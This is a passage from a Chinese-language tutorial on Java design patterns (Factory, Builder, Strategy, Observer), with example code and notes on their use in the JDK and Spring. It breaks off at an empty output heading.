        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Driving a car."</span>);
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title">Bicycle</span> <span class="hljs-title">extends</span> <span class="hljs-title">Vehicle</span> {
    @Override
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">drive</span>()</span> {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Riding a bicycle."</span>);
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title">Truck</span> <span class="hljs-title">extends</span> <span class="hljs-title">Vehicle</span> {
    @Override
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">drive</span>()</span> {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Driving a truck."</span>);
    }
}

<span class="hljs-comment">// 工厂类：交通工具工厂 (Vehicle factories)</span>
<span class="hljs-keyword">class</span> <span class="hljs-title">VehicleFactory</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Vehicle <span class="hljs-title">createVehicle</span>(<span class="hljs-params">String vehicleType</span>)</span> {
        <span class="hljs-keyword">switch</span> (vehicleType) {
            <span class="hljs-keyword">case</span><span class="hljs-string">"car"</span>:
                <span class="hljs-function">returnnew <span class="hljs-title">Car</span>()</span>;
            <span class="hljs-keyword">case</span><span class="hljs-string">"bicycle"</span>:
                <span class="hljs-function">returnnew <span class="hljs-title">Bicycle</span>()</span>;
            <span class="hljs-keyword">case</span><span class="hljs-string">"truck"</span>:
                <span class="hljs-function">returnnew <span class="hljs-title">Truck</span>()</span>;
            <span class="hljs-literal">default</span>:
                <span class="hljs-function">thrownew <span class="hljs-title">IllegalArgumentException</span>(<span class="hljs-params"><span class="hljs-string">"Invalid vehicle type: "</span> + vehicleType</span>)</span>;
        }
    }
}

<span class="hljs-comment">// 测试类</span>
publicclass FactoryPatternExample {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span>(<span class="hljs-params">String[] args</span>)</span> {
        <span class="hljs-comment">// 创建一辆汽车并驾驶</span>
        Vehicle car = VehicleFactory.createVehicle(<span class="hljs-string">"car"</span>);
        car.drive();

        <span class="hljs-comment">// 创建一辆自行车并骑行</span>
        Vehicle bicycle = VehicleFactory.createVehicle(<span class="hljs-string">"bicycle"</span>);
        bicycle.drive();

        <span class="hljs-comment">// 创建一辆卡车并驾驶</span>
        Vehicle truck = VehicleFactory.createVehicle(<span class="hljs-string">"truck"</span>);
        truck.drive();
    }
}
</code></pre>
<h3 data-id="heading-7">代码解释：</h3>
<ul>
<li>当你需要制造交通工具时，不需要直接调用 <code>Car</code>、<code>Bicycle</code>或 <code>Truck</code>的构造函数，而是调用 <code>VehicleFactory.createVehicle()</code>方法，并传入你想要制造的交通工具类型。</li>
<li>工厂会根据你提供的类型创建并返回相应的交通工具实例。</li>
<li>你可以通过调用 <code>drive()</code>方法来使用制造出来的交通工具。</li>
</ul>
<h3 data-id="heading-8">优点：</h3>
<ul>
<li>代码解耦：交通工具的创建逻辑和使用逻辑分离。用户不需要关心具体的交通工具创建过程，只需要告诉工厂想要什么类型的交通工具。</li>
<li>易于扩展：如果你想添加新的交通工具类型，只需创建一个新的具体交通工具类并继承 <code>Vehicle</code>，然后在 <code>VehicleFactory</code>的 <code>createVehicle()</code>方法中添加相应的创建逻辑即可。</li>
</ul>
<p>例如，如果你想添加 <code>Motorcycle</code>（摩托车）类型，可以这样做：</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">class</span> <span class="hljs-title">Motorcycle</span> <span class="hljs-title">extends</span> <span class="hljs-title">Vehicle</span> {
    @Override
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">drive</span>()</span> {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Riding a motorcycle."</span>);
    }
}
</code></pre>
<p>然后在 <code>VehicleFactory</code>中添加相应的逻辑：</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">class</span> <span class="hljs-title">VehicleFactory</span> {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Vehicle <span class="hljs-title">createVehicle</span>(<span class="hljs-params">String vehicleType</span>)</span> {
        <span class="hljs-keyword">switch</span> (vehicleType) {
            <span class="hljs-keyword">case</span><span class="hljs-string">"car"</span>:
                <span class="hljs-function">returnnew <span class="hljs-title">Car</span>()</span>;
            <span class="hljs-keyword">case</span><span class="hljs-string">"bicycle"</span>:
                <span class="hljs-function">returnnew <span class="hljs-title">Bicycle</span>()</span>;
            <span class="hljs-keyword">case</span><span class="hljs-string">"truck"</span>:
                <span class="hljs-function">returnnew <span class="hljs-title">Truck</span>()</span>;
            <span class="hljs-keyword">case</span><span class="hljs-string">"motorcycle"</span>:
                <span class="hljs-function">returnnew <span class="hljs-title">Motorcycle</span>()</span>; <span class="hljs-comment">// 添加摩托车创建逻辑</span>
            <span class="hljs-literal">default</span>:
                <span class="hljs-function">thrownew <span class="hljs-title">IllegalArgumentException</span>(<span class="hljs-params"><span class="hljs-string">"Invalid vehicle type: "</span> + vehicleType</span>)</span>;
        }
    }
}
</code></pre>
<p>这个例子展示了工厂模式如何通过工厂类将对象的创建和使用分离，使得代码更具可扩展性和可维护性，同时也方便了新产品类型的添加。</p>
<p><strong>如果你想进一步避免在工厂类中使用</strong> <strong><code>switch</code></strong> <strong>或</strong> <strong><code>if-else</code></strong> <strong>语句，可以使用反射机制如下：</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">VehicleFactory</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-title class_">Vehicle</span> <span class="hljs-title function_">createVehicle</span>(<span class="hljs-params">Class&lt;? <span class="hljs-keyword">extends</span> Vehicle&gt; vehicleClass</span>) {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-title class_">Constructor</span>&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Vehicle</span>&gt; constructor = vehicleClass.<span class="hljs-title function_">getDeclaredConstructor</span>();
            <span class="hljs-keyword">return</span> constructor.<span class="hljs-title function_">newInstance</span>();
        } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">NoSuchMethodException</span> | <span class="hljs-title class_">InstantiationException</span> | <span class="hljs-title class_">IllegalAccessException</span> | <span class="hljs-title class_">InvocationTargetException</span> e) {
            thrownew <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"Failed to create vehicle: "</span> + e.<span class="hljs-title function_">getMessage</span>());
        }
    }
}

<span class="hljs-keyword">public</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">FactoryPatternExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) {
        <span class="hljs-comment">// 创建一辆汽车并驾驶</span>
        <span class="hljs-title class_">Vehicle</span> car = <span class="hljs-title class_">VehicleFactory</span>.<span class="hljs-title function_">createVehicle</span>(<span class="hljs-title class_">Car</span>.<span class="hljs-property">class</span>);
        car.<span class="hljs-title function_">drive</span>();

        <span class="hljs-comment">// 创建一辆自行车并骑行</span>
        <span class="hljs-title class_">Vehicle</span> bicycle = <span class="hljs-title class_">VehicleFactory</span>.<span class="hljs-title function_">createVehicle</span>(<span class="hljs-title class_">Bicycle</span>.<span class="hljs-property">class</span>);
        bicycle.<span class="hljs-title function_">drive</span>();

        <span class="hljs-comment">// 创建一辆卡车并驾驶</span>
        <span class="hljs-title class_">Vehicle</span> truck = <span class="hljs-title class_">VehicleFactory</span>.<span class="hljs-title function_">createVehicle</span>(<span class="hljs-title class_">Truck</span>.<span class="hljs-property">class</span>);
        truck.<span class="hljs-title function_">drive</span>();
    }
}
</code></pre>
<p>这种方法利用反射避免了繁琐的条件判断，提高了工厂的可扩展性。当添加新的交通工具类型时，无需修改工厂类代码。你只需要将新交通工具类的 <code>Class</code>对象传递给工厂类的 <code>createVehicle()</code>方法即可。</p>
<h3 data-id="heading-9">JDK 中的应用：</h3>
<ul>
<li><code>java.util.Calendar.getInstance()</code></li>
<li><code>javax.xml.parsers.DocumentBuilderFactory.newInstance()</code></li>
</ul>
<h3 data-id="heading-10">Spring 中的应用：</h3>
<ul>
<li><code>BeanFactory</code>和 <code>ApplicationContext</code>都是工厂模式的体现。</li>
</ul>
<h2 data-id="heading-11">3. 建造者模式</h2>
<p>建造者模式用于创建复杂对象，特别是当对象拥有多个可选参数时。</p>
<p>代码实现：组装一台电脑</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 产品类：电脑 (Computer)</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Computer</span> {
    <span class="hljs-keyword">private</span> String cpu;
    <span class="hljs-keyword">private</span> String memory;
    <span class="hljs-keyword">private</span> String storage;
    <span class="hljs-keyword">private</span> String graphicsCard;
    <span class="hljs-keyword">private</span> String operatingSystem;

    <span class="hljs-comment">// 私有构造函数，只能通过 Builder 创建对象</span>
    <span class="hljs-keyword">private</span> Computer(Builder builder) {
        <span class="hljs-keyword">this</span>.cpu = builder.cpu;
        <span class="hljs-keyword">this</span>.memory = builder.memory;
        <span class="hljs-keyword">this</span>.storage = builder.storage;
        <span class="hljs-keyword">this</span>.graphicsCard = builder.graphicsCard;
        <span class="hljs-keyword">this</span>.operatingSystem = builder.operatingSystem;
    }

     <span class="hljs-comment">// 静态内部类 Builder</span>
    publicstatic<span class="hljs-keyword">class</span> <span class="hljs-title class_">Builder</span> {
        <span class="hljs-keyword">private</span> String cpu;
        <span class="hljs-keyword">private</span> String memory;
        <span class="hljs-keyword">private</span> String storage;
        <span class="hljs-keyword">private</span> String graphicsCard;
        <span class="hljs-keyword">private</span> String operatingSystem;

        <span class="hljs-comment">// 必填参数通过构造函数传递</span>
        <span class="hljs-keyword">public</span> Builder(String cpu, String memory) {
            <span class="hljs-keyword">this</span>.cpu = cpu;
            <span class="hljs-keyword">this</span>.memory = memory;
        }

        <span class="hljs-comment">// 设置可选参数的方法</span>
        <span class="hljs-keyword">public</span> Builder storage(String storage) {
            <span class="hljs-keyword">this</span>.storage = storage;
            returnthis;
        }

        <span class="hljs-keyword">public</span> Builder graphicsCard(String graphicsCard) {
            <span class="hljs-keyword">this</span>.graphicsCard = graphicsCard;
            returnthis;
        }

        <span class="hljs-keyword">public</span> Builder operatingSystem(String operatingSystem) {
            <span class="hljs-keyword">this</span>.operatingSystem = operatingSystem;
            returnthis;
        }

        <span class="hljs-comment">// 构建最终的 Computer 对象</span>
        <span class="hljs-keyword">public</span> Computer build() {
            returnnew Computer(<span class="hljs-keyword">this</span>);
        }
    }

    <span class="hljs-comment">// 显示电脑配置信息</span>
    <span class="hljs-keyword">public</span> void showConfiguration() {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"CPU: "</span> + cpu);
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Memory: "</span> + memory);
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Storage: "</span> + storage);
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Graphics Card: "</span> + graphicsCard);
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Operating System: "</span> + operatingSystem);
    }
}

<span class="hljs-comment">// 测试类</span>
<span class="hljs-keyword">public</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">BuilderPatternExample</span> {
    <span class="hljs-keyword">public</span> static void main(String[] args) {
        <span class="hljs-comment">// 使用建造者模式构建电脑</span>
        Computer computer = new Computer.Builder(<span class="hljs-string">"Intel i7"</span>, <span class="hljs-string">"16GB"</span>)
               .storage(<span class="hljs-string">"1TB SSD"</span>)
               .graphicsCard(<span class="hljs-string">"NVIDIA RTX 4060"</span>)
               .operatingSystem(<span class="hljs-string">"Windows 10"</span>)
               .build();

        <span class="hljs-comment">// 显示电脑配置信息</span>
        computer.showConfiguration();
    }
}
</code></pre>
<h3 data-id="heading-12"><strong>JDK 中的应用：</strong></h3>
<ul>
<li><code>StringBuilder</code></li>
<li><code>Stream.Builder</code></li>
</ul>
<h3 data-id="heading-13"><strong>Spring 中的应用：</strong></h3>
<ul>
<li><code>BeanDefinitionBuilder</code>用于构建 <code>BeanDefinition</code>对象，这是 Spring 容器管理 Bean 的核心组件。</li>
<li><code>UriComponentsBuilder</code>用于构建 URI。</li>
</ul>
<h2 data-id="heading-14">4. 策略模式</h2>
<p>策略模式将不同的算法封装成独立的类，并允许在运行时选择不同的策略。</p>
<h3 data-id="heading-15">代码实现：出行方式的选择</h3>
<p>这次我们以出行方式的选择为例。不同的出行方式有不同的成本和速度，根据用户需求可以选择不同的出行策略：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 策略接口：出行策略 (Travel Strategy)</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">TravelStrategy</span> {
    <span class="hljs-built_in">void</span> <span class="hljs-title function_">travel</span>();
    double <span class="hljs-title function_">calculateCost</span>(double distance);
    double <span class="hljs-title function_">calculateTime</span>(double distance);
}

<span class="hljs-comment">// 具体策略：步行 (Walk)</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">WalkStrategy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">TravelStrategy</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">travel</span>(<span class="hljs-params"/>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Choose to travel on foot."</span>);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> double <span class="hljs-title function_">calculateCost</span>(<span class="hljs-params">double distance</span>) {
        <span class="hljs-comment">// 步行通常没有成本</span>
        return0<span class="hljs-number">.0</span>; 
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> double <span class="hljs-title function_">calculateTime</span>(<span class="hljs-params">double distance</span>) {
        <span class="hljs-comment">// 假设步行速度为每小时 5 公里</span>
        <span class="hljs-keyword">return</span> distance / <span class="hljs-number">5.0</span>; 
    }
}

<span class="hljs-comment">// 具体策略：自行车 (Bike)</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">BikeStrategy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">TravelStrategy</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">travel</span>(<span class="hljs-params"/>) {
        <span class="hljs-comment">// 选择骑自行车出行</span>
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Choose to travel by bike."</span>);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> double <span class="hljs-title function_">calculateCost</span>(<span class="hljs-params">double distance</span>) {
        <span class="hljs-comment">// 自行车通常没有成本</span>
        return0<span class="hljs-number">.0</span>; 
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> double <span class="hljs-title function_">calculateTime</span>(<span class="hljs-params">double distance</span>) {
        <span class="hljs-comment">// 假设自行车速度为每小时 15 公里</span>
        <span class="hljs-keyword">return</span> distance / <span class="hljs-number">15.0</span>; 
    }
}

<span class="hljs-comment">// 具体策略：汽车 (Car)</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CarStrategy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">TravelStrategy</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">travel</span>(<span class="hljs-params"/>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Choose to travel by car."</span>);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> double <span class="hljs-title function_">calculateCost</span>(<span class="hljs-params">double distance</span>) {
        <span class="hljs-comment">// 假设汽车每公里成本为 0.5 美元</span>
        <span class="hljs-keyword">return</span> distance * <span class="hljs-number">0.5</span>; 
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> double <span class="hljs-title function_">calculateTime</span>(<span class="hljs-params">double distance</span>) {
        <span class="hljs-comment">// 假设汽车速度为每小时 60 公里</span>
        <span class="hljs-keyword">return</span> distance / <span class="hljs-number">60.0</span>; 
    }
}

<span class="hljs-comment">// 具体策略：飞机 (Airplane)</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">AirplaneStrategy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">TravelStrategy</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">travel</span>(<span class="hljs-params"/>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Choose to travel by airplane."</span>);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> double <span class="hljs-title function_">calculateCost</span>(<span class="hljs-params">double distance</span>) {
        <span class="hljs-comment">// 假设飞机每公里成本为 0.8 美元</span>
        <span class="hljs-keyword">return</span> distance * <span class="hljs-number">0.8</span>; 
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> double <span class="hljs-title function_">calculateTime</span>(<span class="hljs-params">double distance</span>) {
        <span class="hljs-comment">// 假设飞机速度为每小时 800 公里</span>
        <span class="hljs-keyword">return</span> distance / <span class="hljs-number">800.0</span>; 
    }
}

<span class="hljs-comment">// 上下文类：旅行规划者 (Travel Planner)</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">TravelPlanner</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">TravelStrategy</span> travelStrategy;

    <span class="hljs-keyword">public</span> <span class="hljs-title class_">TravelPlanner</span>(<span class="hljs-title class_">TravelStrategy</span> travelStrategy) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">travelStrategy</span> = travelStrategy;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">setTravelStrategy</span>(<span class="hljs-params">TravelStrategy travelStrategy</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">travelStrategy</span> = travelStrategy;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">planTravel</span>(<span class="hljs-params"/>) {
        travelStrategy.<span class="hljs-title function_">travel</span>();
    }

    <span class="hljs-keyword">public</span> double <span class="hljs-title function_">calculateCost</span>(<span class="hljs-params">double distance</span>) {
        <span class="hljs-keyword">return</span> travelStrategy.<span class="hljs-title function_">calculateCost</span>(distance);
    }

    <span class="hljs-keyword">public</span> double <span class="hljs-title function_">calculateTime</span>(<span class="hljs-params">double distance</span>) {
        <span class="hljs-keyword">return</span> travelStrategy.<span class="hljs-title function_">calculateTime</span>(distance);
    }
}

<span class="hljs-comment">// 测试类</span>
<span class="hljs-keyword">public</span><span class="hljs-keyword">class</span> <span class="hljs-title class_">StrategyPatternExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>) {
        double distance = <span class="hljs-number">100.0</span>; <span class="hljs-comment">// 假设旅行距离为 100 公里</span>

        <span class="hljs-comment">// 步行出行</span>
        <span class="hljs-title class_">TravelPlanner</span> travelPlanner1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TravelPlanner</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WalkStrategy</span>());
        travelPlanner1.<span class="hljs-title function_">planTravel</span>();
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Cost: "</span> + travelPlanner1.<span class="hljs-title function_">calculateCost</span>(distance) + <span class="hljs-string">" dollars"</span>);
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Time: "</span> + travelPlanner1.<span class="hljs-title function_">calculateTime</span>(distance) + <span class="hljs-string">" hours"</span>);

        <span class="hljs-comment">// 骑自行车出行</span>
        <span class="hljs-title class_">TravelPlanner</span> travelPlanner2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TravelPlanner</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BikeStrategy</span>());
        travelPlanner2.<span class="hljs-title function_">planTravel</span>();
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Cost: "</span> + travelPlanner2.<span class="hljs-title function_">calculateCost</span>(distance) + <span class="hljs-string">" dollars"</span>);
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Time: "</span> + travelPlanner2.<span class="hljs-title function_">calculateTime</span>(distance) + <span class="hljs-string">" hours"</span>);

        <span class="hljs-comment">// 开车出行</span>
        <span class="hljs-title class_">TravelPlanner</span> travelPlanner3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TravelPlanner</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CarStrategy</span>());
        travelPlanner3.<span class="hljs-title function_">planTravel</span>();
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Cost: "</span> + travelPlanner3.<span class="hljs-title function_">calculateCost</span>(distance) + <span class="hljs-string">" dollars"</span>);
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Time: "</span> + travelPlanner3.<span class="hljs-title function_">calculateTime</span>(distance) + <span class="hljs-string">" hours"</span>);

        <span class="hljs-comment">// 乘飞机出行</span>
        <span class="hljs-title class_">TravelPlanner</span> travelPlanner4 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TravelPlanner</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AirplaneStrategy</span>());
        travelPlanner4.<span class="hljs-title function_">planTravel</span>();
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Cost: "</span> + travelPlanner4.<span class="hljs-title function_">calculateCost</span>(distance) + <span class="hljs-string">" dollars"</span>);
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"Time: "</span> + travelPlanner4.<span class="hljs-title function_">calculateTime</span>(distance) + <span class="hljs-string">" hours"</span>);
    }
}
</code></pre>
<h3 data-id="heading-16">代码解释：</h3>
<ul>
<li>首先，通过实现 <code>TravelStrategy</code>接口定义了不同的出行策略。</li>
<li>然后，创建 <code>TravelPlanner</code>对象，并根据需要选择不同的出行策略。</li>
<li>最后，调用 <code>planTravel()</code>方法执行出行操作，并使用 <code>calculateCost()</code>和 <code>calculateTime()</code>方法计算成本和时间。</li>
</ul>
<h3 data-id="heading-17">优点：</h3>
<ul>
<li>易于扩展：如果你想添加新的出行方式，只需创建一个新的 <code>TravelStrategy</code>实现类，无需修改 <code>TravelPlanner</code>类的代码。</li>
<li>灵活切换：你可以轻松地在不同出行策略之间切换，以满足不同的出行需求。</li>
<li>代码清晰：不同出行方式的逻辑被封装在各自的策略类中，使得代码更具可读性和可维护性。</li>
</ul>
<p>这个例子可以帮助你更好地理解策略模式在实际场景中的应用。通过不同的策略实现不同的行为，并能根据用户需求灵活选择和切换策略，同时保持了代码的可扩展性和可维护性。</p>
<p>此外，策略模式通常与工厂模式结合使用，可以将策略对象的创建和使用分离，使代码更加灵活和易于维护。</p>
<h3 data-id="heading-18">JDK 中的应用：</h3>
<ul>
<li><code>java.util.Comparator</code>是一个典型的策略模式。</li>
</ul>
<h3 data-id="heading-19">Spring 中的应用：</h3>
<ul>
<li>事务管理 (<code>TransactionManager</code>)，支持编程式和声明式事务。</li>
</ul>
<h2 data-id="heading-20">5. 观察者模式</h2>
<p>观察者模式定义了一种一对多的依赖关系。当一个对象的状态发生变化时，所有依赖于它的对象都会收到通知。</p>
<h3 data-id="heading-21">代码实现：股价更新系统</h3>
<p>模拟当股价更新时通知投资者。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.ArrayList;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-comment">// 观察者接口</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">StockObserver</span> {
    <span class="hljs-comment">// 当股价更新时，此方法将被主题调用</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-type">double</span> price)</span>; 
}

<span class="hljs-comment">// 具体观察者：投资者 (Investor)</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Investor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">StockObserver</span> {
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Investor</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-type">double</span> price)</span> {
        <span class="hljs-comment">// 打印投资者的名字和接收到的股价更新信息</span>
        System.out.println(name + <span class="hljs-string">" received an update: The current stock price is "</span> + price); 
    }
}

<span class="hljs-comment">// 主题接口 (Subject interface)</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">StockSubject</span> {
    <span class="hljs-comment">// 注册观察者</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerObserver</span><span class="hljs-params">(StockObserver observer)</span>; 
    <span class="hljs-comment">// 移除观察者</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeObserver</span><span class="hljs-params">(StockObserver observer)</span>; 
    <span class="hljs-comment">// 通知所有注册的观察者</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">notifyObservers</span><span class="hljs-params">()</span>; 
}

<span class="hljs-comment">// 具体主题：股票 (Stock)</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Stock</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">StockSubject</span> {
    <span class="hljs-keyword">private</span> List&lt;StockObserver&gt; observers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    privatedouble price;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerObserver</span><span class="hljs-params">(StockObserver observer)</span> {
        <span class="hljs-comment">// 将观察者添加到观察者列表</span>
        observers.add(observer); 
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeObserver</span><span class="hljs-params">(StockObserver observer)</span> {
        <span class="hljs-comment">// 从观察者列表中移除观察者</span>
        observers.remove(observer); 
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">notifyObservers</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 遍历观察者列表，调用每个观察者的 update 方法进行通知</span>
        <span class="hljs-keyword">for</span> (StockObserver observer : observers) {
            observer.update(price);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPrice</span><span class="hljs-params">(<span class="hljs-type">double</span> price)</span> {
        <span class="hljs-comment">// 设置新的股价并通知观察者</span>
        <span class="hljs-built_in">this</span>.price = price; 
        notifyObservers();
    }
}

<span class="hljs-comment">// 测试类</span>
publicclass ObserverPatternExample {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">Stock</span> <span class="hljs-variable">stock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Stock</span>();

        <span class="hljs-type">Investor</span> <span class="hljs-variable">investor1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Investor</span>(<span class="hljs-string">"Alice"</span>);
        <span class="hljs-type">Investor</span> <span class="hljs-variable">investor2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Investor</span>(<span class="hljs-string">"Bob"</span>);
        <span class="hljs-type">Investor</span> <span class="hljs-variable">investor3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Investor</span>(<span class="hljs-string">"Charlie"</span>);

        <span class="hljs-comment">// 注册投资者为观察者</span>
        stock.registerObserver(investor1);
        stock.registerObserver(investor2);
        stock.registerObserver(investor3);

        <span class="hljs-comment">// 更新股价，观察者将收到通知</span>
        stock.setPrice(<span class="hljs-number">100.0</span>); 
        stock.setPrice(<span class="hljs-number">105.0</span>);

        <span class="hljs-comment">// 移除一个观察者</span>
        stock.removeObserver(investor2); 

        <span class="hljs-comment">// 再次更新股价，剩余的观察者将收到通知</span>
        stock.setPrice(<span class="hljs-number">110.0</span>); 
    }
}
</code></pre>
<p>输出：</p>
